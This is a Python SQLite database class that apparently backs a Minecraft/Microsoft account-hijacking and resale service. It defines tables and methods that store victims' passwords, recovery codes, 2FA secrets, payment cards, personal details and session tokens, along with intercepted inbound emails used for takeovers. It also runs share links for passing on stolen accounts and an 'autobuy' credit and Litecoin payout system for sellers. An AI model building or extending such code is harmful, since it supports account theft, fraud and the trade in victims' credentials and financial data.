import sqlite3
import json

class DBConnection:
    def __init__(self) -> None:
        self.conn = sqlite3.connect("database/database.db", check_same_thread=False)
        self.cursor = self.conn.cursor()

    def __enter__(self):
        return self

    def __exit__(self, *args) -> None:
        self.conn.close()

    def setup_tables(self) -> None:
        self.cursor.executescript("""
            CREATE TABLE IF NOT EXISTS `security_emails` (
                email TEXT,
                password TEXT
            );

            CREATE TABLE IF NOT EXISTS `blacklisted_users` (
                id INTEGER UNIQUE
            );

            CREATE TABLE IF NOT EXISTS `secured_accounts` (
                account_id TEXT UNIQUE,
                ms_email TEXT,
                ms_security_email TEXT,
                ms_password TEXT,
                ms_recovery_code TEXT,
                ms_auth_secret TEXT,
                ms_first_name TEXT,
                ms_last_name TEXT,
                ms_full_name TEXT,
                ms_region TEXT,
                ms_birthday TEXT,
                ms_language TEXT,
                ms_family TEXT,
                ms_devices TEXT,
                ms_cards TEXT,
                ms_subscriptions_active TEXT,
                ms_subscriptions_canceled TEXT,
                ms_subscriptions_commercial TEXT,
                mc_name TEXT,
                mc_method TEXT,
                mc_gamertag TEXT,
                mc_uchange TEXT,
                mc_capes TEXT,
                mc_ssid TEXT,
                secured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );

            CREATE TABLE IF NOT EXISTS `stats` (
                account_id TEXT,
                mc_username TEXT,
                game TEXT,
                stats_json TEXT,
                last_updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                PRIMARY KEY (account_id, game)
            );

            CREATE TABLE IF NOT EXISTS `received_emails` (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                to_address TEXT,
                from_address TEXT,
                subject TEXT,
                body TEXT,
                received_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                consumed INTEGER DEFAULT 0
            );

            CREATE TABLE IF NOT EXISTS `shared_links` (
                id TEXT PRIMARY KEY,
                account_id TEXT NOT NULL,
                password TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                access_count INTEGER DEFAULT 0,
                FOREIGN KEY (account_id) REFERENCES secured_accounts(account_id)
            );

            CREATE TABLE IF NOT EXISTS `autobuy_users` (
                discord_id INTEGER PRIMARY KEY,
                ltc_address TEXT NOT NULL,
                linked_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );

            CREATE TABLE IF NOT EXISTS `autobuy_credits` (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                discord_id INTEGER NOT NULL,
                amount_usd REAL NOT NULL,
                remaining_usd REAL NOT NULL,
                available_at TIMESTAMP NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                source TEXT,
                email TEXT
            );

            CREATE TABLE IF NOT EXISTS `autobuy_sells` (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                discord_id INTEGER NOT NULL,
                email TEXT NOT NULL,
                success INTEGER NOT NULL DEFAULT 0,
                credit_id INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );

            CREATE TABLE IF NOT EXISTS `autobuy_withdrawals` (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                discord_id INTEGER NOT NULL,
                amount_usd REAL NOT NULL,
                amount_ltc REAL,
                ltc_address TEXT NOT NULL,
                txid TEXT,
                status TEXT NOT NULL,
                error TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            );
        """)
        self.conn.commit()

    # Security Emails
    def add_security_email(self, email: str, pwd: str) -> None:
        self.cursor.execute("""
            INSERT INTO `security_emails` (email, password)
            VALUES (?, ?)
        """, (email, pwd)
        )

        self.conn.commit()

    def remove_security_email(self, email: str) -> None:
        self.cursor.execute("""
            DELETE FROM `security_emails` WHERE email = ?
        """, (email,))
        self.conn.commit()

    def get_email_password(self, email: str) -> str | None:
        password = self.cursor.execute("""
            SELECT password FROM `security_emails`
            WHERE email = ?
        """, (email,)
        ).fetchone()

        return password

    def get_security_emails(self) -> tuple:
        emails = self.cursor.execute("""
            SELECT email FROM `security_emails`
        """).fetchall()

        return emails

    # Received Emails
    def add_email(self, to_address: str, from_address: str, subject: str, body: str) -> None:
        self.cursor.execute("""
            INSERT INTO `received_emails` (to_address, from_address, subject, body)
            VALUES (?, ?, ?, ?)
        """, (to_address, from_address, subject, body))
        self.conn.commit()

    def get_emails(self, to_address: str) -> list:
        return self.cursor.execute("""
            SELECT id, to_address, from_address, subject, body, received_at
            FROM `received_emails`
            WHERE to_address = ?
            ORDER BY received_at ASC
        """, (to_address.lower(),)).fetchall()

    def mark_unused(self, to_address: str) -> tuple | None:
        return self.cursor.execute("""
            SELECT id, body FROM `received_emails`
            WHERE to_address = ? AND consumed = 0
            ORDER BY received_at ASC
            LIMIT 1
        """, (to_address.lower(),)).fetchone()

    def mark_used(self, email_id: int) -> None:
        self.cursor.execute("""
            UPDATE `received_emails` SET consumed = 1 WHERE id = ?
        """, (email_id,))
        self.conn.commit()

    # Blacklisting
    def get_blacklisted_users(self) -> list:
        users = self.cursor.execute("""
            SELECT id FROM `blacklisted_users`
        """).fetchall()

        return [user_id for (user_id,) in users]

    def add_blacklisted_user(self, id: int) -> None:
        self.cursor.execute("""
            INSERT OR IGNORE INTO `blacklisted_users` (id)
            VALUES (?)
        """, (id,))
        self.conn.commit()

    def remove_blacklisted_user(self, id: int) -> None:
        self.cursor.execute("""
            DELETE FROM `blacklisted_users`
            WHERE id = ?
        """, (id,))
        self.conn.commit()

    # Secured Accounts
    def add_secured_account(self, account_id: str, account: dict) -> None:
        ms = account["microsoft"]
        mc = account["minecraft"]
        subs = ms["subscriptions"]

        self.cursor.execute("""
            INSERT INTO `secured_accounts` (
                account_id,
                ms_email, ms_security_email, ms_password, ms_recovery_code, ms_auth_secret,
                ms_first_name, ms_last_name, ms_full_name, ms_region, ms_birthday, ms_language,
                ms_family, ms_devices, ms_cards,
                ms_subscriptions_active, ms_subscriptions_canceled, ms_subscriptions_commercial,
                mc_name, mc_method, mc_gamertag, mc_uchange, mc_capes, mc_ssid
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            account_id,
            ms["email"], ms["security_email"], ms["password"], ms["recovery_code"], ms["auth_secret"],
            ms["firstName"], ms["lastName"], ms["fullName"], ms["region"], ms["birthday"], ms["language"],
            json.dumps(ms["family"]), json.dumps(ms["devices"]), json.dumps(ms["cards"]),
            json.dumps(subs["active"]), json.dumps(subs["canceled"]), json.dumps(subs["commercial"]),
            mc["name"], mc["method"], mc["gamertag"], mc["uchange"], mc["capes"], str(mc["SSID"])
        ))
        self.conn.commit()

    def is_valid_account_id(self, account_id: str) -> bool:
        result = self.cursor.execute("""
            SELECT 1 FROM `secured_accounts` WHERE account_id = ?
        """, (account_id,)).fetchone()
        return result is not None

    def delete_secured_account(self, account_id: str) -> bool:
        if not self.is_valid_account_id(account_id):
            return False
        self.cursor.execute("DELETE FROM stats WHERE account_id = ?", (account_id,))
        self.cursor.execute("DELETE FROM shared_links WHERE account_id = ?", (account_id,))
        self.cursor.execute("DELETE FROM secured_accounts WHERE account_id = ?", (account_id,))
        self.conn.commit()
        return True

    def delete_secured_accounts(self, account_ids: list[str]) -> int:
        """Delete many accounts in one transaction. Returns number deleted."""
        ids = [aid for aid in account_ids if self.is_valid_account_id(aid)]
        if not ids:
            return 0
        placeholders = ",".join("?" * len(ids))
        self.cursor.execute(f"DELETE FROM stats WHERE account_id IN ({placeholders})", ids)
        self.cursor.execute(f"DELETE FROM shared_links WHERE account_id IN ({placeholders})", ids)
        self.cursor.execute(
            f"DELETE FROM secured_accounts WHERE account_id IN ({placeholders})", ids
        )
        deleted = self.cursor.rowcount
        self.conn.commit()
        return deleted

    # Web Methods
    def get_all_secured_accounts(self) -> list:
        rows = self.cursor.execute("""
            SELECT account_id, ms_email, ms_security_email, ms_password, ms_recovery_code, ms_auth_secret,
                   mc_name, mc_method, mc_gamertag, mc_capes, secured_at
            FROM secured_accounts
            ORDER BY secured_at DESC
            LIMIT 100
        """).fetchall()
        keys = [
            "account_id", "ms_email", "ms_security_email", "ms_password", "ms_recovery_code", "ms_auth_secret",
            "mc_name", "mc_method", "mc_gamertag", "mc_capes", "secured_at",
        ]
        return [dict(zip(keys, row)) for row in rows]

    def get_stats(self) -> dict:
        total = self.cursor.execute("SELECT COUNT(*) FROM secured_accounts").fetchone()[0]
        has_mc = self.cursor.execute(
            "SELECT COUNT(*) FROM secured_accounts WHERE mc_name != 'No Minecraft' AND mc_name IS NOT NULL"
        ).fetchone()[0]
        shared = self.get_shared_links_count()
        return {"total": total, "has_minecraft": has_mc, "shared_links": shared}

    def get_detailed_stats(self) -> dict:
        best_day = self.cursor.execute("""
            SELECT DATE(secured_at), COUNT(*) AS cnt
            FROM secured_accounts
            GROUP BY DATE(secured_at)
            ORDER BY cnt DESC LIMIT 1
        """).fetchone()

        best_month = self.cursor.execute("""
            SELECT strftime('%Y-%m', secured_at), COUNT(*) AS cnt
            FROM secured_accounts
            GROUP BY strftime('%Y-%m', secured_at)
            ORDER BY cnt DESC LIMIT 1
        """).fetchone()

        days_active = self.cursor.execute("""
            SELECT COUNT(DISTINCT DATE(secured_at)) FROM secured_accounts
        """).fetchone()[0]

        total = self.cursor.execute("SELECT COUNT(*) FROM secured_accounts").fetchone()[0]
        daily_avg = round(total / days_active, 1) if days_active else 0
        return {
            "best_day": best_day[0] if best_day else None,
            "best_day_count": best_day[1] if best_day else 0,
            "best_month": best_month[0] if best_month else None,
            "best_month_count": best_month[1] if best_month else 0,
            "daily_avg": daily_avg,
            "days_active": days_active,
        }

    def get_chart_data(self) -> list:
        rows = self.cursor.execute("""
            SELECT DATE(secured_at) as day, COUNT(*) as secures
            FROM secured_accounts
            WHERE secured_at >= DATE('now', '-6 days')
            GROUP BY DATE(secured_at)
            ORDER BY day ASC
        """).fetchall()
        return [{"day": row[0], "secures": row[1]} for row in rows]

    def save_stats(self, account_id: str, mc_username: str, game: str, stats_json: str) -> None:
        self.cursor.execute("""
            INSERT INTO stats (account_id, mc_username, game, stats_json, last_updated)
            VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
            ON CONFLICT(account_id, game) DO UPDATE SET
                stats_json = excluded.stats_json,
                mc_username = excluded.mc_username,
                last_updated = CURRENT_TIMESTAMP
        """, (account_id, mc_username, game, stats_json))
        self.conn.commit()

    def get_stats_for_account(self, account_id: str) -> dict:
        rows = self.cursor.execute("""
            SELECT game, stats_json, mc_username, last_updated
            FROM stats WHERE account_id = ?
        """, (account_id,)).fetchall()
        result = {}
        for game, stats_json, mc_username, last_updated in rows:
            result[game] = {
                "stats": json.loads(stats_json),
                "mc_username": mc_username,
                "last_updated": last_updated,
            }
        return result

    def get_secured_account(self, account_id: str) -> dict | None:
        row = self.cursor.execute("""
            SELECT account_id, ms_email, ms_security_email, ms_password, ms_recovery_code, ms_auth_secret,
                   ms_first_name, ms_last_name, ms_full_name, ms_region, ms_birthday, ms_language,
                   ms_family, ms_devices, ms_cards,
                   ms_subscriptions_active, ms_subscriptions_canceled, ms_subscriptions_commercial,
                   mc_name, mc_method, mc_gamertag, mc_uchange, mc_capes, mc_ssid, secured_at
            FROM `secured_accounts` WHERE account_id = ?
        """, (account_id,)).fetchone()

        if not row:
            return None
        
        keys = [
            "account_id", "ms_email", "ms_security_email", "ms_password", "ms_recovery_code", "ms_auth_secret",
            "ms_first_name", "ms_last_name", "ms_full_name", "ms_region", "ms_birthday", "ms_language",
            "ms_family", "ms_devices", "ms_cards",
            "ms_subscriptions_active", "ms_subscriptions_canceled", "ms_subscriptions_commercial",
            "mc_name", "mc_method", "mc_gamertag", "mc_uchange", "mc_capes", "mc_ssid", "secured_at"
        ]
        data = dict(zip(keys, row))
        json_fields = [
            "ms_family", "ms_devices", "ms_cards",
            "ms_subscriptions_active", "ms_subscriptions_canceled",
            "ms_subscriptions_commercial",
        ]

        for field in json_fields:
            value = data.get(field)
            if value and isinstance(value, str):
                try:
                    parsed = json.loads(value)
                    if isinstance(parsed, list):
                        data[field] = parsed
                except (json.JSONDecodeError, TypeError):
                    pass

        return data

    # Shared Links
    def create_share_link(self, link_id: str, account_id: str, password: str | None = None) -> None:
        self.cursor.execute("""
            INSERT INTO shared_links (id, account_id, password)
            VALUES (?, ?, ?)
        """, (link_id, account_id, password))
        self.conn.commit()

    def get_share_link(self, link_id: str) -> dict | None:
        row = self.cursor.execute("""
            SELECT id, account_id, password, created_at, access_count
            FROM shared_links WHERE id = ?
        """, (link_id,)).fetchone()
        if not row:
            return None
        return {
            "id": row[0], "account_id": row[1],
            "password": row[2], "created_at": row[3],
            "access_count": row[4],
        }

    def get_shared_links_for_account(self, account_id: str) -> list:
        rows = self.cursor.execute("""
            SELECT id, account_id, password, created_at, access_count
            FROM shared_links WHERE account_id = ?
            ORDER BY created_at DESC
        """, (account_id,)).fetchall()
        return [{
            "id": r[0], "account_id": r[1],
            "has_password": r[2] is not None,
            "created_at": r[3], "access_count": r[4],
        } for r in rows]

    def delete_share_link(self, link_id: str) -> None:
        self.cursor.execute("DELETE FROM shared_links WHERE id = ?", (link_id,))
        self.conn.commit()

    def increment_share_link_access(self, link_id: str) -> None:
        self.cursor.execute("""
            UPDATE shared_links SET access_count = access_count + 1 WHERE id = ?
        """, (link_id,))
        self.conn.commit()

    def get_shared_links_count(self) -> int:
        return self.cursor.execute("SELECT COUNT(*) FROM shared_links").fetchone()[0]

    # Autobuy
    def autobuy_set_ltc(self, discord_id: int, ltc_address: str) -> None:
        self.cursor.execute("""
            INSERT INTO autobuy_users (discord_id, ltc_address, linked_at)
            VALUES (?, ?, CURRENT_TIMESTAMP)
            ON CONFLICT(discord_id) DO UPDATE SET
                ltc_address = excluded.ltc_address,
                linked_at = CURRENT_TIMESTAMP
        """, (discord_id, ltc_address))
        self.conn.commit()

    def autobuy_get_ltc(self, discord_id: int) -> str | None:
        row = self.cursor.execute(
            "SELECT ltc_address FROM autobuy_users WHERE discord_id = ?",
            (discord_id,),
        ).fetchone()
        return row[0] if row else None

    def autobuy_add_credit(
        self,
        discord_id: int,
        amount_usd: float,
        available_at: str,
        source: str,
        email: str,
    ) -> int:
        self.cursor.execute("""
            INSERT INTO autobuy_credits
                (discord_id, amount_usd, remaining_usd, available_at, source, email)
            VALUES (?, ?, ?, ?, ?, ?)
        """, (discord_id, amount_usd, amount_usd, available_at, source, email))
        self.conn.commit()
        return int(self.cursor.lastrowid)

    def autobuy_record_sell(
        self,
        discord_id: int,
        email: str,
        success: bool,
        credit_id: int | None = None,
    ) -> None:
        self.cursor.execute("""
            INSERT INTO autobuy_sells (discord_id, email, success, credit_id)
            VALUES (?, ?, ?, ?)
        """, (discord_id, email, 1 if success else 0, credit_id))
        self.conn.commit()

    def autobuy_sells_today(self, discord_id: int) -> int:
        row = self.cursor.execute("""
            SELECT COUNT(*) FROM autobuy_sells
            WHERE discord_id = ?
              AND success = 1
              AND DATE(created_at) = DATE('now')
        """, (discord_id,)).fetchone()
        return int(row[0] or 0)

    def autobuy_balances(self, discord_id: int) -> dict:
        pending = self.cursor.execute("""
            SELECT COALESCE(SUM(remaining_usd), 0) FROM autobuy_credits
            WHERE discord_id = ?
              AND remaining_usd > 0
              AND available_at > CURRENT_TIMESTAMP
        """, (discord_id,)).fetchone()[0]
        available = self.cursor.execute("""
            SELECT COALESCE(SUM(remaining_usd), 0) FROM autobuy_credits
            WHERE discord_id = ?
              AND remaining_usd > 0
              AND available_at <= CURRENT_TIMESTAMP
        """, (discord_id,)).fetchone()[0]
        return {
            "pending_usd": float(pending or 0),
            "available_usd": float(available or 0),
            "total_usd": float(pending or 0) + float(available or 0),
        }

    def autobuy_consume_credits(self, discord_id: int, amount_usd: float) -> list[tuple[int, float]]:
        """Consume available credits FIFO. Returns list of (credit_id, taken_usd)."""
        if amount_usd <= 0:
            return []
        rows = self.cursor.execute("""
            SELECT id, remaining_usd FROM autobuy_credits
            WHERE discord_id = ?
              AND remaining_usd > 0
              AND available_at <= CURRENT_TIMESTAMP
            ORDER BY available_at ASC, id ASC
        """, (discord_id,)).fetchall()

        remaining = round(float(amount_usd), 8)
        taken: list[tuple[int, float]] = []
        for credit_id, rem in rows:
            if remaining <= 0:
                break
            rem = float(rem)
            use = min(rem, remaining)
            new_rem = round(rem - use, 8)
            self.cursor.execute(
                "UPDATE autobuy_credits SET remaining_usd = ? WHERE id = ?",
                (new_rem, credit_id),
            )
            taken.append((int(credit_id), use))
            remaining = round(remaining - use, 8)

        if remaining > 0.0001:
            # rollback partial consumption in this connection by reverting
            for credit_id, use in taken:
                self.cursor.execute(
                    "UPDATE autobuy_credits SET remaining_usd = remaining_usd + ? WHERE id = ?",
                    (use, credit_id),
                )
            self.conn.commit()
            return []

        self.conn.commit()
        return taken

    def autobuy_refund_credits(self, taken: list[tuple[int, float]]) -> None:
        for credit_id, used in taken:
            self.cursor.execute(
                "UPDATE autobuy_credits SET remaining_usd = remaining_usd + ? WHERE id = ?",
                (used, credit_id),
            )
        self.conn.commit()

    def autobuy_add_withdrawal(
        self,
        discord_id: int,
        amount_usd: float,
        amount_ltc: float | None,
        ltc_address: str,
        status: str,
        txid: str | None = None,
        error: str | None = None,
    ) -> int:
        self.cursor.execute("""
            INSERT INTO autobuy_withdrawals
                (discord_id, amount_usd, amount_ltc, ltc_address, txid, status, error)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        """, (discord_id, amount_usd, amount_ltc, ltc_address, txid, status, error))
        self.conn.commit()
        return int(self.cursor.lastrowid)

    def autobuy_update_withdrawal(
        self,
        withdrawal_id: int,
        *,
        status: str,
        txid: str | None = None,
        amount_ltc: float | None = None,
        error: str | None = None,
    ) -> None:
        self.cursor.execute("""
            UPDATE autobuy_withdrawals
            SET status = ?,
                txid = COALESCE(?, txid),
                amount_ltc = COALESCE(?, amount_ltc),
                error = COALESCE(?, error)
            WHERE id = ?
        """, (status, txid, amount_ltc, error, withdrawal_id))
        self.conn.commit()
